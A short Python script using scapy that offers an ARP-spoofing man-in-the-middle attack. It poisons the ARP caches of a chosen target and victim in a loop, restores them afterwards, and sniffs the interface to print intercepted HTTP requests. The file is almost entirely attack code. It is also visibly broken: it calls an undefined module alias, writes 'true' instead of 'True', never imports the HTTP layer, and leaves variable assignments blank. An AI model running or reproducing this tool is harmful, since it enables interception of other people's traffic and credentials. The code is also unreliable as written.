import scapy.all as scapy
import time


t=#enter the target ip you want to spoof/fool(eg router)
v=#enter the victim ip you want target to assume you for(eg any divice conecceted on your network)
interface=#enter the interface to sniff the packet upon
def getmac(ip):
    req=scp.ARP(pdst=ip)
    brod=scp.Ether(dst='ff:ff:ff:ff:ff:ff')
    request=brod/req
    a=scp.srp(request,timeout=1,verbose=False)[0]
    return a[1].hwsrc
def spoof(target,victim):
    req=scp.ARP(op=2,pdst=target,psrc=victim,hwdst=getmac(target))
    scp.send(req,verbose=False)


def restore(target,source):
    req=scp.ARP(op=2,pdst=target,psrc=source,hwdst=getmac(target),hwsrc=getmac(source))
    scp.send(req,count=4,verbose=False)

def do_spoof(target_ip,victim_ip):
    while true:
        spoof(target_ip,victim_ip)
        spoof(victim_ip,target_ip)
        time.sleep(2)

def do_restore(target_ip,source_ip):
    restore(target_ip,source_ip)
    restore(source_ip,target_ip)





#packet sniffer
def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet)




#do_spoof(t,v)
#do_restore(t,v)
#sniff(interface)
